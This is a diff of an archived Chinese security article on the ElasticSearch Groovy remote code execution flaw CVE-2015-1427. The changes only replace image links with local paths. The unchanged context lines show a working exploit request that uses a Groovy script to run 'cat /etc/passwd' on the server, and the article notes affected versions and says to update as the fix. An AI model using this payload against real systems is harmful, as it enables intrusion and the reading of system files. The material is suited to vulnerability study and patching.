@@ -57,7 +57,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gaLFPkLpeIy1SC3dmBY9VA)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa24an9TvS6grA3sWoTRYSQr4oCwuZgRaUPIJV1AesaAsTmry4zs6pvkE64q5U77Dz3TdpLFhEcdcRA/640?wx_fmt=jpeg)
+![](../../.resource/remote/776dcd8a0943ab54358881497f7839f13ade0690e403d4c1005dd0f3aae660b0.jpg)
 
 **（ElasticSearch Groovy 远程代码执行漏洞   CVE-2015-1427）**
 
@@ -86,7 +86,7 @@ Content-Length: 409
 {"size":1,"script_fields": {"gem#": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getInputStream())).readLines()","lang": "groovy"\}\\}\}
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24an9TvS6grA3sWoTRYSQr4xX3Y0sJKkbdHNuMnKGkBSKl2Gas71HOmJaLB3UsnsCb5UzLIPvhXuQ/640?wx_fmt=png)
+![](../../.resource/remote/0c8b5ba42b71a57283fbd8c59e1f047a974ee343e8b7ae2d1ca8d87009095a20.png)
 
 **受影响版本：**  
 
@@ -100,9 +100,9 @@ Content-Length: 409
 
 更新最新版本。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa260lZABWwEo49lodRtpGIOoYYt5Ojm4Y1sdMD4ez7rL55g1IW3icCTOia91YicOrh1sjuOB5TiaUibCiaiaA/640?wx_fmt=jpeg)
+![](../../.resource/remote/221591930eed440bd20e1f3a48fe3a6955668851ff4b7e625c88e0b79c3b4d4d.jpg)
 
-一起学习，请关注我![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24an9TvS6grA3sWoTRYSQr4hZQYrCwcz8gD1evatvHgAquT3YhfNMxgqib63eQ1mRnQVjQA6W9icxFg/640?wx_fmt=png)
+一起学习，请关注我![](../../.resource/remote/33ed3313c169926038b31e08c29cc323ec78682054867d009cd87d360f94912d.png)
 
 免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!
 
